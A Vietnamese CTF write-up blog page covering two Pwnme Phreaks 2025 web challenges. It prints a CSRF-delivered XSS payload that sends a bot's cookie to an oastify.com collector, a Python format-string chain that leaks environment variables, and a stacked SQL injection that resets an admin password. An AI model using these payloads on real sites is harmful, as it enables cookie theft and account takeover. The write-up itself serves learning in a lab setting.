@@ -1,0 +1,257 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Sau một tháng lu bu việc học, việc tết, việc làm&mldr; Mình bỏ bê CTF khá lâu mà không thực sự chú tâm vào nó. Nay mình mới lật đật ngồi làm các bài tại giải pwnme phreaks,&mldr; Mình động vào 3 bài, tuy nhiên là có 1 bài blackbox mà giải end họ đóng luôn website nên đành chịu ¯\\_(ツ)_/¯. Sau đây là write up của mình với 2 chall whitebox mà mình chưa kịp sol trong thời gian giải diễn ra.\n"><title>Pwnme Phreaks CTF 2025 write up</title><link rel=canonical href=https://kev1n1203.github.io/p/pwnme-phreaks-2025/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="Pwnme Phreaks CTF 2025 write up"><meta property='og:description' content="Sau một tháng lu bu việc học, việc tết, việc làm&mldr; Mình bỏ bê CTF khá lâu mà không thực sự chú tâm vào nó. Nay mình mới lật đật ngồi làm các bài tại giải pwnme phreaks,&mldr; Mình động vào 3 bài, tuy nhiên là có 1 bài blackbox mà giải end họ đóng luôn website nên đành chịu ¯\\_(ツ)_/¯. Sau đây là write up của mình với 2 chall whitebox mà mình chưa kịp sol trong thời gian giải diễn ra.\n"><meta property='og:url' content='https://kev1n1203.github.io/p/pwnme-phreaks-2025/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2025-03-03T00:00:00+00:00'><meta property='article:modified_time' content='2025-03-03T00:00:00+00:00'><meta name=twitter:title content="Pwnme Phreaks CTF 2025 write up"><meta name=twitter:description content="Sau một tháng lu bu việc học, việc tết, việc làm&mldr; Mình bỏ bê CTF khá lâu mà không thực sự chú tâm vào nó. Nay mình mới lật đật ngồi làm các bài tại giải pwnme phreaks,&mldr; Mình động vào 3 bài, tuy nhiên là có 1 bài blackbox mà giải end họ đóng luôn website nên đành chịu ¯\\_(ツ)_/¯. Sau đây là write up của mình với 2 chall whitebox mà mình chưa kịp sol trong thời gian giải diễn ra.\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#say-my-name>Say My Name</a><ol><li><a href=#xss-with-csrf>XSS with CSRF</a></li><li><a href=#format-string-python>Format String Python</a></li></ol></li><li><a href=#pwnshop>pwnshop</a><ol><li><a href=#sql-injection-to-admin-role>SQL Injection to Admin role</a></li><li><a href=#0-day-in-lessphp-library-leads-to-rce>0 day in less.php Library leads to RCE</a><ol><li><a href=#funny-walkaround>Funny Walkaround</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/pwnme-phreaks-2025/>Pwnme Phreaks CTF 2025 write up</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-03-03T00:00:00Z>Mar 03, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>10 minute read</time></div></footer></div></header><section class=article-content><p>Sau một tháng lu bu việc học, việc tết, việc làm&mldr; Mình bỏ bê CTF khá lâu mà không thực sự chú tâm vào nó. Nay mình mới lật đật ngồi làm các bài tại giải pwnme phreaks,&mldr; Mình động vào 3 bài, tuy nhiên là có 1 bài blackbox mà giải end họ đóng luôn website nên đành chịu <code>¯\_(ツ)_/¯</code>. Sau đây là write up của mình với 2 chall whitebox mà mình chưa kịp sol trong thời gian giải diễn ra.</p><h2 id=say-my-name>Say My Name</h2><p>Một challenge code bằng python với source code ngắn, ý tưởng khá trực quan. Vừa mở code, mình đã thấy <code>bot.py</code> (damn, lại XSS)<br><img src=https://hackmd.io/_uploads/B1N94yXikg.png loading=lazy alt=image><br></p><h3 id=xss-with-csrf>XSS with CSRF</h3><p>Khi render template python để dính XSS thì ta cần có option <code>|safe</code> trong expression, mình đi tìm trong code thì chỉ có giá trị name trong <code>templates/yourname.html</code> là dính:<br><img src=https://hackmd.io/_uploads/HyhwIymikg.png loading=lazy alt=image><br>Nó nằm trong một dấu nháy kép của document.location và trong tiếp thuộc tính onfocus của thẻ <code>&lt;a></code>
+Đoạn code render template này là route <code>/your-name</code> bằng 1 POST request (thế thì report cho bot kiểu chóa gì)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def sanitize_input(input_string):
+</span></span><span class=line><span class=cl>    input_string = input_string.replace(&#39;&lt;&#39;, &#39;&#39;)
+</span></span><span class=line><span class=cl>    input_string = input_string.replace(&#39;&gt;&#39;, &#39;&#39;)
+</span></span><span class=line><span class=cl>    input_string = input_string.replace(&#39;\&#39;&#39;, &#39;&#39;)
+</span></span><span class=line><span class=cl>    input_string = input_string.replace(&#39;&amp;&#39;, &#39;&#39;)
+</span></span><span class=line><span class=cl>    input_string = input_string.replace(&#39;&#34;&#39;, &#39;\\&#34;&#39;)
+</span></span><span class=line><span class=cl>    input_string = input_string.replace(&#39;:&#39;, &#39;&#39;)
+</span></span><span class=line><span class=cl>    return input_string
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/your-name&#39;, methods=[&#39;POST&#39;])
+</span></span><span class=line><span class=cl>def your_name():
+</span></span><span class=line><span class=cl>    if request.method == &#39;POST&#39;:
+</span></span><span class=line><span class=cl>        name = request.form.get(&#39;name&#39;)
+</span></span><span class=line><span class=cl>        return Response(render_template(&#39;your-name.html&#39;, name=sanitize_input(name)), content_type=&#39;text/html&#39;)\
+</span></span></code></pre></td></tr></table></div></div><p>Với hàm sanitize_input, mình sẽ không thể thoát khỏi được sự kiện onfocus hay mở thẻ mới. Nên lúc này mình đã mất khá nhiều thời gian chỉ để đi tìm cách bypass, đi search mxss của firefox, xss trên firefox các kiểu để nhận ra nó không hoạt động như thế =)))
+Đoạn code report và visit nó vẫn giống các chall XSS thường thấy nên mình không nhắc đến nữa, còn câu hỏi đặt ra là phải report cho con bot như nào để nó POST đến /your-name thì mình sẽ dùng CSRF.</p><ul><li>Mình tạo response có chứa payload CSRF cơ bản trên request repo:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;form action=&#34;http://192.168.92.187:5000/your-name&#34; method=&#34;POST&#34;&gt;
+</span></span><span class=line><span class=cl>      &lt;input type=&#34;hidden&#34; name=&#34;name&#34; value=&#34;133337&#34; /&gt;
+</span></span><span class=line><span class=cl>&lt;/form&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;
+</span></span><span class=line><span class=cl>      document.forms[0].submit();
+</span></span><span class=line><span class=cl>&lt;/script&gt;
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/HkZe_JQsJg.png loading=lazy alt=image><br></p><ul><li>Ném cho con bot link html này là được:
+<img src=https://hackmd.io/_uploads/SyWd_y7ikx.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/rkg9_Jms1e.png loading=lazy alt=image><br></li></ul><p>Đã có thể đưa cho con bot payload, giờ mình sẽ tìm cách bypass XSS. Mình đã nghĩ không thể nào chèn thêm được cái gì vào cái URL kia, nên ý tưởng ban đầu của mình là trigger sự kiện onfocus bằng cách thêm fragment là id của thẻ đó vào URL (<a class=link href=https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all target=_blank rel=noopener>Document</a>), sau đó XSS tại trang mà nó redirect sang là behindthename.com:<br><img src=https://hackmd.io/_uploads/rkxXFkQikg.png loading=lazy alt=image><br>Ai cũng biết là idea này không giòn tí nào, site kia không dính XSS, cũng như mình vẫn bị filter nên không điền đc payload tùy ý.
+Nhìn lại filter, mình đã quên mất là nó không hề filter nháy kép mà chỉ thêm <code>\</code> vào trước, mình hoàn toàn có thể bypass bằng <code>\"</code> rồi comment đoạn đằng sau lại là có thể XSS:<br><img src=https://hackmd.io/_uploads/B1cpKkQjJe.png loading=lazy alt=image><br>JS code sẽ được trigger trước khi redirect sang <a class=link href=https://www.behindthename.com/ target=_blank rel=noopener>https://www.behindthename.com/</a><br><img src=https://hackmd.io/_uploads/rkOyqkXoJg.png loading=lazy alt=image><br>Giờ thì chỉ cần fetch thôi, lưu ý vì chall chặn cả <code>:</code> nên khi fetch có thể bỏ <code>https:</code> đi mà chỉ cần <code>//URL</code> là được:<br><img src=https://hackmd.io/_uploads/r1zjn1Xo1x.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/HJ4ahk7ikx.png loading=lazy alt=image><br>Giờ thì lấy token của bot thôi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;form action=&#34;http://127.0.0.1:5000/your-name#behindthename-redirect&#34; method=&#34;POST&#34;&gt;
+</span></span><span class=line><span class=cl>      &lt;input type=&#34;hidden&#34; name=&#34;name&#34; value=&#39;1\&#34;;fetch(`//vvu7nop54qkhrr3xp05tf2qqjhp8dz1o.oastify.com/?1337=`+document.cookie)//&#39; /&gt;
+</span></span><span class=line><span class=cl>&lt;/form&gt;
+</span></span><span class=line><span class=cl>&lt;script&gt;
+</span></span><span class=line><span class=cl>      document.forms[0].submit();
+</span></span><span class=line><span class=cl>&lt;/script&gt;
+</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/SkhzJe7skl.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/BycDWxmo1x.png loading=lazy alt=image><br>Mình đã có X-Admin-Token là 8657e9a9dec84afb8710a1a4a9e09efb</p><h3 id=format-string-python>Format String Python</h3><p>Với X-Admin-Token, mình đã có thể truy cập được route <code>/admin</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def run_cmd(): # I will do that later
+</span></span><span class=line><span class=cl>    pass
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/admin&#39;, methods=[&#39;GET&#39;])
+</span></span><span class=line><span class=cl>def admin():
+</span></span><span class=line><span class=cl>    if request.cookies.get(&#39;X-Admin-Token&#39;) != X_Admin_Token:
+</span></span><span class=line><span class=cl>        return &#39;Access denied&#39;, 403
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    prompt = request.args.get(&#39;prompt&#39;)
+</span></span><span class=line><span class=cl>    return render_template(&#39;admin.html&#39;, cmd=f&#34;{prompt if prompt else &#39;prompt$/&gt;&#39;}{run_cmd()}&#34;.format(run_cmd))
+</span></span></code></pre></td></tr></table></div></div><ul><li>Route này nhận args từ URL là prompt, sau đó render ra giá trị cmd và format 2 lần: 1 lần với <code>f""</code> và 1 lần với <code>.format(run_cmd)</code></li><li>Kết quả sẽ có None bởi vì hàm run_cmd() không chạy một thứ gì cả</li><li>Tại lần đầu tiên, nếu như ta để <code>{}</code> thì tại lần format thứ 2 thứ được thay vào là hàm run_cmd, dẫn đến việc xảy ra format string:<br><img src=https://hackmd.io/_uploads/H1yeXe7ikg.png loading=lazy alt=image><br></li></ul><p>Cộng với việc flag được để trong environment, ta confirm đây là lỗi format string vì với format string ta không thể RCE.<br><img src=https://hackmd.io/_uploads/r15Xmlmsyx.png loading=lazy alt=image><br>Đầu tiên mình cứ nghĩ là sẽ không control được các attribute vì mình cần chèn vào bên format() ví dụ như <code>.format(run_cmd.__init__)</code>, nhưng mình không ngờ là có thể call trực tiếp từ bên trong phần format (kiến thức mới)
+Giờ ta sẽ đi tìm chain để tiến hành leak environment, ngon nhất là <code>.__globals__[os].environ</code>, tuy nhiên tại đây thì attribute globals không có module os nên ta phải đi tìm cái khác vậy:<br><img src=https://hackmd.io/_uploads/rkdJNxmiye.png loading=lazy alt=image><br>Phiên bản đẹp hơn:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__name__&#39;</span><span class=p>:</span> <span class=s1>&#39;__main__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__doc__&#39;</span><span class=p>:</span> <span class=n>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__package__&#39;</span><span class=p>:</span> <span class=n>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__loader__&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>_frozen_importlib_external</span><span class=o>.</span><span class=n>SourceFileLoader</span> <span class=n>object</span> <span class=n>at</span> <span class=mh>0x717c0d982220</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__spec__&#39;</span><span class=p>:</span> <span class=n>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__annotations__&#39;</span><span class=p>:</span> <span class=p>{},</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__builtins__&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>module</span> <span class=s1>&#39;builtins&#39;</span> <span class=p>(</span><span class=n>built</span><span class=o>-</span><span class=ow>in</span><span class=p>)</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__file__&#39;</span><span class=p>:</span> <span class=s1>&#39;/app/app.py&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;__cached__&#39;</span><span class=p>:</span> <span class=n>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;Flask&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=k>class</span> <span class=s1>&#39;flask.app.Flask&#39;</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;render_template&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>render_template</span> <span class=n>at</span> <span class=mh>0x717c0c5c7160</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;request&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>Request</span> <span class=s1>&#39;http://192.168.92.187:5000/admin?prompt={.__globals__}&#39;</span> <span class=p>[</span><span class=n>GET</span><span class=p>]</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;Response&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=k>class</span> <span class=s1>&#39;flask.wrappers.Response&#39;</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;redirect&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>redirect</span> <span class=n>at</span> <span class=mh>0x717c0c7591f0</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;url_for&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>url_for</span> <span class=n>at</span> <span class=mh>0x717c0c7c3f70</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;visit_report&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>visit_report</span> <span class=n>at</span> <span class=mh>0x717c0c58d790</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;token_hex&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>token_hex</span> <span class=n>at</span> <span class=mh>0x717c0cb6e9d0</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;X_Admin_Token&#39;</span><span class=p>:</span> <span class=s1>&#39;8657e9a9dec84afb8710a1a4a9e09efb&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;run_cmd&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>run_cmd</span> <span class=n>at</span> <span class=mh>0x717c0d9cd040</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;sanitize_input&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>sanitize_input</span> <span class=n>at</span> <span class=mh>0x717c0c2698b0</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;app&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>Flask</span> <span class=s1>&#39;app&#39;</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;admin&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>admin</span> <span class=n>at</span> <span class=mh>0x717c0c272940</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;index&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>index</span> <span class=n>at</span> <span class=mh>0x717c0c2729d0</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;your_name&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>your_name</span> <span class=n>at</span> <span class=mh>0x717c0c272b80</span><span class=o>&gt;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;report&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=n>function</span> <span class=n>report</span> <span class=n>at</span> <span class=mh>0x717c0c272c10</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Mày mò một lúc thì mình cũng thấy từ attribute Flask có thể dẫn đến os:<br><img src=https://hackmd.io/_uploads/SJl24xmsye.png loading=lazy alt=image><br><code>{.__globals__[Flask].__init__.__globals__[os].environ}</code><br><img src=https://hackmd.io/_uploads/B1c1Hx7jye.png loading=lazy alt=image><br></p><h2 id=pwnshop>pwnshop</h2><p>Một challenge PHP với lượng source khá đồ sộ so với chall phía trên, có đầy đủ các chức năng của một shop online. Mục tiêu của chúng ta là RCE:<br><img src=https://hackmd.io/_uploads/BJCuwrmj1g.png loading=lazy alt=image><br>Một số folder đáng chú ý trong src:<br><img src=https://hackmd.io/_uploads/HyKqwHQskl.png loading=lazy alt=image><br></p><ul><li>API: Chứa routing cho các api CRUD tại website và code chức năng/phân quyền sử dụng chức năng, là controller cho toàn bộ project</li><li>Auth: Code config JWT và set cookie khi login thành công</li><li>Models: Chứa các đối tượng và các hàm query DB với từng đối tượng</li><li>Security: Filter file upload và XML file</li></ul><h3 id=sql-injection-to-admin-role>SQL Injection to Admin role</h3><p>Sau khi đọc qua một lượt, mình tập trung chủ yếu vào file Api/Rest/RestController.php vì nó chứa routing và các hàm được sử dụng trong các api tương ứng. Một số hàm sẽ lấy từ Models.
+Còn Security mình không để ý lắm vì đoạn code filter XML khá dài và lan man, còn file upload thì nghỉ đi vì họ whitelist rồi.
+Tại route /api/orders/search sử dụng method searchOrders, ta có thể khai thác SQL Injection qua param limit:<br><img src=https://hackmd.io/_uploads/ryg-KBXike.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/S1OGFB7s1g.png loading=lazy alt=image><br>Tại đây searchOrders gọi đến function search trong model Order, giá trị của param limit được nối vào mà không có filter gì:<br><img src=https://hackmd.io/_uploads/B1vTYH7j1x.png loading=lazy alt=image><br>Không như tính năng search của model Product, param limit được ép về int trước khi nối chuỗi:<br><img src=https://hackmd.io/_uploads/B1Pb5HXiyg.png loading=lazy alt=image><br>Ta hoàn toàn có thể stacked query, quá ngon:<br><img src=https://hackmd.io/_uploads/HyxUoHXo1x.png loading=lazy alt=image><br>Mình lập tức nghĩ đến việc write file to RCE với into dumpfile hoặc into outfile, nhưng mình không write được. Ngồi 1 lúc thì mình thấy lí do là vì user DB không đủ quyền để write, nếu như dùng root để vào mysql bằng <code>mysql -u root</code> thì ta có thể ghi được. Còn user của ta đang là <code>user-pwnshop</code> chỉ có quyền thao tác db pwnshop chứ không có quyền FILE -> không thể đọc/ghi file:<br><img src=https://hackmd.io/_uploads/Hk9uZP7sJl.png loading=lazy alt=image><br>Nhìn thấy bảng users có admin, mình đổi mật khẩu admin thành 12345678 để log in luôn:<br><img src=https://hackmd.io/_uploads/B16JpBQjyx.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/SJQQCSXoJx.png loading=lazy alt=image><br></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>update users set password = &#39;$2y$10$sB/I2oDHtik8W2fWX3odE.FSDq9fGJ6U5HWOMfhSIhLkYMNY.0o5m&#39; where username=&#39;admin&#39;
